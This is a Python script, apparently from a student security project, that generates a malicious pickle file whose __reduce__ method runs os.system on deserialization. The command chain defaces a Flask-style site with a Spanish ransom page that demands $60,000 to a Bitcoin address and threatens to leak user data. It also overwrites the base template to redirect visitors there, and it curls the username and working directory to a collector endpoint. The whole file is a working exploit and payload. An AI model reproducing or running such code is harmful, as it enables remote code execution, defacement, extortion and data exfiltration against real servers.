import pickle
import os

class AtaqueDemo:
    def __reduce__(self):
        cmd = (
            'echo ^<!DOCTYPE html^>^<html lang="es"^>^<head^>^<meta charset="UTF-8"^>^<title^>Servidor hackeado^</title^>'
            '^</head^>^<body style="background:black; color:lime; text-align:center;"^>^<h1^>Servidor comprometido por GROUP5^</h1^>'
            '^<p^>Este servidor ha sido hackeado como demostracion para el TP integrador... o no?^</p^>'
            '^<h2^>Rescate: $60.000^</h2^>'
            '^<h3^>Primeras 24 horas: $20.000^</h3^>'
            '^<h3^>Segundas 24 horas: $40.000^</h3^>'
            '^<h3^>Tenemos todos los datos de los usuarios, si a las 24 horas, no vemos depositadas los $20.000, procederemos a leakear todo.^</h3^>'
            '^<h3^>Si a las 48 horas, no vemos depositadas los $60.000, procederemos a desaparecer todo el servidor.^</h3^>'
            '^<h1^>BTC Adress: 1J7mdg5rbQyUHENYdx39WVWK7fsLpEoXZy^</h1^>'
             '^<script^>let count = Math.floor((new Date(2025, 5, 17, 0, 0, 0) - new Date()) / 1000); setInterval(() =^> {document.getElementById("timer").innerText = new Date(count*1000).toISOString().substr(11, 8); count--; }, 1000);^</script^>'
               '^<h1 id="timer" style="color:red;"^>^</h1^>^</body^>^</html^> > static\\pwned.html && '
            'echo ^<!DOCTYPE html^>^<html^>^<head^>^<meta http-equiv="refresh" content="0; URL=/static/pwned.html"^>^</head^>^<body^>^<p^>Redirigiendo...^</p^>^</body^>^</html^> > templates\\base.html && '
            'curl -X POST http://localhost:5001/recibir --data "usuario=%USERNAME%&archivos=%CD%"'
        )
        return (os.system, (cmd,))

with open('malware_escapado.pkl', 'wb') as f:
    pickle.dump(AtaqueDemo(), f)

print("[âœ”] malware_escapado.pkl generado correctamente.")
